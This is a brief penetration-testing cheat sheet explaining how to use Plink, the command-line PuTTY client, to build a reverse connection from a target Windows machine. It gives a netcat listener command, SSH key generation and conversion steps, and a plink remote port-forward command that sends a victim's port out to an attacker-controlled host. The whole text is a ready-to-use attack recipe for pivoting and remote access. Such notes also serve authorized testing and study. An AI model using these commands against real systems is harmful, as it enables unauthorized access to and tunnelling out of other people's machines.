Plink is a Windows command line version of the PuTTY SSH client.

Reverse Connection
1. Open Lisnter in Your Local Machine
nc -lvnp 4444
Copied!
2. Run Reverse Connection in Target Machine
First of all, generate SSH keys. Two keys (public and private) will be generated.

ssh-keygen
Copied!
Convert the private key for Windows.

puttygen private_key -o private_key.ppk
Copied!
Run reverse connection using plink.

cmd.exe /c echo y | .\plink.exe -R <attack-port>:<victim-ip>:<victim-port> attacker@<attack-ip> -i private_key.ppk -N
